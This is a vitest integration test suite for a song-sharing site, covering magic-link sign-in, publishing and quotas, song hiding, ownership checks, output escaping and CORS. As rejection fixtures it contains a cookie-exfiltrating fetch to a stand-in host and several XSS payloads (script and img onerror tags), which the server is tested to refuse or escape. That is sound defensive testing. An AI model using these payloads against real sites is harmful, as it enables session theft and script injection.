import { mkdtempSync, readdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'
import { createSite, type Site, type SiteOptions } from '../../server/site'
import { writeSongFile, type SongFile } from '../../src/library/songfile'

let site: Site
let dataDir: string
let clock = 1_700_000_000_000

const start = async (more: Partial<SiteOptions> = {}) => (site = await createSite({ port: 0, dataDir, now: () => clock, ...more }))
const ask = (path: string, init: RequestInit & { token?: string; json?: unknown } = {}) =>
    fetch(site.origin + path, {
        ...init,
        ...(init.json === undefined ? {} : { method: init.method ?? 'POST', body: JSON.stringify(init.json) }),
        headers: { ...(init.json === undefined ? {} : { 'Content-Type': 'application/json' }), ...(init.token ? { Authorization: `Bearer ${init.token}` } : {}), ...init.headers },
    })
const press = (link: string) => fetch(`${site.origin}/sign-in/confirm`, { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `token=${new URL(link).searchParams.get('token')}` })

async function signIn(email = 'ante@example.com', name = 'Ante'): Promise<string> {
    const asked = await (await ask('/api/sign-in', { json: { email, name } })).json()
    await press(asked.link)
    return (await (await ask('/api/sign-in/poll', { json: { id: asked.id, secret: asked.secret } })).json()).token
}

const mp3 = (bytes = 2000) => Buffer.from(Uint8Array.from({ length: bytes }, (_, at) => (at === 0 ? 0xff : at === 1 ? 0xfb : 0))).toString('base64')
const wav = (bytes = 64) => {
    const data = new Uint8Array(bytes)
    data.set([...'RIFF'].map((letter) => letter.charCodeAt(0)), 0)
    data.set([...'WAVE'].map((letter) => letter.charCodeAt(0)), 8)
    return data
}
const song = (parts: Partial<SongFile> = {}) => writeSongFile({ name: 'Slow burn', code: 'setcpm(84/4)\n\ndrums: s("bd*4")\nvoc: s("take")\n', keys: {}, sounds: [{ name: 'take', file: 'take.wav', type: 'audio/wav', seconds: 1, data: wav() }], ...parts })
const publish = (token: string, more: Record<string, unknown> = {}) => ask('/api/songs', { token, json: { file: song(), preview: mp3(), description: 'Slow.', style: 'trip hop', licence: 'CC BY 4.0', previewFrom: 8, ...more } })

beforeEach(async () => {
    dataDir = mkdtempSync(join(tmpdir(), 'weft-site-'))
    await start()
})

afterEach(async () => {
    await site.close()
    rmSync(dataDir, { recursive: true, force: true })
})

describe('signing in', () => {
    it('is done by pressing the button behind the link, not by opening the link', async () => {
        const asked = await (await ask('/api/sign-in', { json: { email: ' Ante@Example.com ', name: 'Ante' } })).json()
        const poll = async () => (await ask('/api/sign-in/poll', { json: { id: asked.id, secret: asked.secret } })).json()
        expect(await poll()).toEqual({ state: 'waiting' })
        const opened = await fetch(asked.link)
        expect(await opened.text()).toContain('As ante@example.com.')
        expect(await poll()).toEqual({ state: 'waiting' })
        expect(await (await press(asked.link)).text()).toContain('You are signed in')
        const done = await poll()
        expect(done).toMatchObject({ state: 'done', name: 'Ante', email: 'ante@example.com' })
        expect(await poll()).toEqual({ state: 'gone' })
        expect(await (await ask('/api/me', { token: done.token })).json()).toEqual({ name: 'Ante', email: 'ante@example.com', used: 0, most: 10 })
    })

    it('sends the link by mail when there is a way to, and then does not hand it back', async () => {
        await site.close()
        const sent: string[][] = []
        await start({ mail: (to, link) => void sent.push([to, link]) })
        const asked = await (await ask('/api/sign-in', { json: { email: 'mara@example.com' } })).json()
        expect(asked.link).toBeUndefined()
        expect(sent).toHaveLength(1)
        expect(sent[0][0]).toBe('mara@example.com')
        expect(sent[0][1]).toContain('/sign-in/confirm?token=')
    })

    it('refuses what is not an address, a wrong secret, a link that ran out, and too many asks', async () => {
        expect((await ask('/api/sign-in', { json: { email: 'nobody' } })).status).toBe(400)
        const asked = await (await ask('/api/sign-in', { json: { email: 'ante@example.com' } })).json()
        await press(asked.link)
        expect(await (await ask('/api/sign-in/poll', { json: { id: asked.id, secret: 'guess' } })).json()).toEqual({ state: 'gone' })
        const late = await (await ask('/api/sign-in', { json: { email: 'ante@example.com' } })).json()
        clock += 16 * 60 * 1000
        expect((await press(late.link)).status).toBe(410)
        expect(await (await ask('/api/sign-in/poll', { json: { id: late.id, secret: late.secret } })).json()).toEqual({ state: 'gone' })
        let last = 200
        for (let asks = 0; asks < 11; asks++) last = (await ask('/api/sign-in', { json: { email: `p${asks}@example.com` } })).status
        expect(last).toBe(429)
    })

    it('is needed for everything that is a person\'s own', async () => {
        expect((await ask('/api/me')).status).toBe(401)
        expect((await publish('wrong')).status).toBe(401)
        expect((await ask('/api/songs?mine')).status).toBe(401)
        const token = await signIn()
        await ask('/api/sign-out', { token, method: 'POST' })
        expect((await ask('/api/me', { token })).status).toBe(401)
    })
})

describe('publishing', () => {
    it('keeps the song, hands the file back as it came, and lists it', async () => {
        const token = await signIn()
        const answer = await publish(token)
        expect(answer.status).toBe(201)
        const made = await answer.json()
        expect(made).toMatchObject({ name: 'Slow burn', by: 'Ante', style: 'trip hop', licence: 'CC BY 4.0', tempo: 84, patterns: ['drums', 'voc'], previewFrom: 8, hidden: false })
        const file = await fetch(made.file)
        expect(file.headers.get('content-disposition')).toBe('attachment; filename="Slow burn.weft"')
        expect(file.headers.get('x-content-type-options')).toBe('nosniff')
        expect(await file.text()).toBe(song())
        const preview = await fetch(made.preview)
        expect(preview.headers.get('content-type')).toBe('audio/mpeg')
        expect((await preview.arrayBuffer()).byteLength).toBe(2000)
        const listed = await (await ask('/api/songs')).json()
        expect(listed.songs.map((one: { name: string; downloads: number; plays: number }) => [one.name, one.downloads, one.plays])).toEqual([['Slow burn', 1, 1]])
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ used: 1, most: 10 })
    })

    it('checks every file itself, and refuses code that is more than music with its line', async () => {
        const token = await signIn()
        const bad = await publish(token, { file: song({ code: 'voc: s("take")\nfetch("https://example.com/" + document.cookie)' }) })
        expect(bad.status).toBe(422)
        expect(await bad.json()).toEqual({ why: 'code', what: 'fetch is not something a song can use', line: 2 })
        expect((await publish(token, { file: 'not a song' })).status).toBe(422)
        const page = Uint8Array.from([...'<script>alert(1)</script>'].map((letter) => letter.charCodeAt(0)))
        expect(await (await publish(token, { file: song({ sounds: [{ name: 'take', file: 'take.wav', type: 'audio/wav', seconds: 1, data: page }] }) })).json()).toMatchObject({ why: 'sound' })
        expect(await (await publish(token, { file: song({ sounds: [{ name: 'take', file: 'take.wav', type: 'audio/wav', seconds: 1, data: wav(900 * 1024) }] }) })).json()).toMatchObject({ why: 'size' })
        expect(readdirSync(join(dataDir, 'songs'))).toEqual([])
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ used: 0 })
    })

    it('wants a preview that is sound, and a licence', async () => {
        const token = await signIn()
        expect(await (await publish(token, { preview: '' })).json()).toMatchObject({ why: 'preview' })
        expect(await (await publish(token, { preview: Buffer.from('<html>').toString('base64') })).json()).toMatchObject({ why: 'preview' })
        expect(await (await publish(token, { preview: mp3(800 * 1024) })).json()).toMatchObject({ why: 'preview' })
        expect(await (await publish(token, { licence: 'mine' })).json()).toMatchObject({ why: 'licence' })
    })

    it('takes ten songs from a person and no more, until one is deleted', async () => {
        const token = await signIn()
        for (let count = 0; count < 10; count++) expect((await publish(token)).status).toBe(201)
        const full = await publish(token)
        expect(full.status).toBe(409)
        expect(await full.json()).toMatchObject({ why: 'full' })
        const { songs } = await (await ask('/api/songs?mine', { token })).json()
        expect(songs).toHaveLength(10)
        expect(await (await ask(`/api/songs/${songs[0].id}`, { token, method: 'DELETE' })).json()).toEqual({ used: 9, most: 10 })
        expect(readdirSync(join(dataDir, 'songs'))).toHaveLength(18)
        expect((await publish(token)).status).toBe(201)
        expect((await publish(await signIn('mara@example.com', 'Mara'))).status).toBe(201)
    })

    it('hides a song from everyone else, counts it still, and shows it again', async () => {
        const token = await signIn()
        const made = await (await publish(token)).json()
        await ask(`/api/songs/${made.id}/hide`, { token, method: 'POST' })
        expect((await ask('/api/songs').then((answer) => answer.json())).songs).toEqual([])
        expect((await fetch(made.url)).status).toBe(404)
        expect((await fetch(made.file)).status).toBe(404)
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ used: 1 })
        await ask(`/api/songs/${made.id}/show`, { token, method: 'POST' })
        expect((await fetch(made.url)).status).toBe(200)
    })

    it('lets nobody touch a song that is not theirs', async () => {
        const made = await (await publish(await signIn())).json()
        const other = await signIn('mara@example.com', 'Mara')
        expect((await ask(`/api/songs/${made.id}`, { token: other, method: 'DELETE' })).status).toBe(404)
        expect((await ask(`/api/songs/${made.id}/hide`, { token: other, method: 'POST' })).status).toBe(404)
        expect((await fetch(made.url)).status).toBe(200)
    })

    it('shows a song on a page with nothing of the maker\'s words left as markup', async () => {
        const token = await signIn('ante@example.com', '<b>Ante</b>')
        const made = await (await publish(token, { file: song({ name: '<img src=x onerror=alert(1)>' }), description: '<script>alert(2)</script>', style: '"><i>' })).json()
        const page = await fetch(made.url)
        const html = await page.text()
        expect(html).not.toContain('<img src=x')
        expect(html).not.toContain('<script>')
        expect(html).not.toContain('<b>Ante</b>')
        expect(html).toContain('&#60;img src=x onerror=alert(1)&#62;')
        expect(page.headers.get('content-security-policy')).toContain("default-src 'none'")
    })

    it('still has everything after it is started again', async () => {
        const token = await signIn()
        const made = await (await publish(token)).json()
        await site.close()
        await start()
        expect(await (await ask('/api/me', { token })).json()).toMatchObject({ name: 'Ante', used: 1 })
        expect((await fetch(`${site.origin}/songs/${made.id}.weft`)).status).toBe(200)
    })

    it('answers the app from where the app runs, and nobody else\'s pages', async () => {
        const mine = await ask('/api/songs', { headers: { Origin: 'tauri://localhost' } })
        expect(mine.headers.get('access-control-allow-origin')).toBe('tauri://localhost')
        const theirs = await ask('/api/songs', { headers: { Origin: 'https://example.com' } })
        expect(theirs.headers.get('access-control-allow-origin')).toBeNull()
        expect((await ask('/api/songs', { method: 'OPTIONS', headers: { Origin: 'http://localhost:5180' } })).status).toBe(204)
    })
})
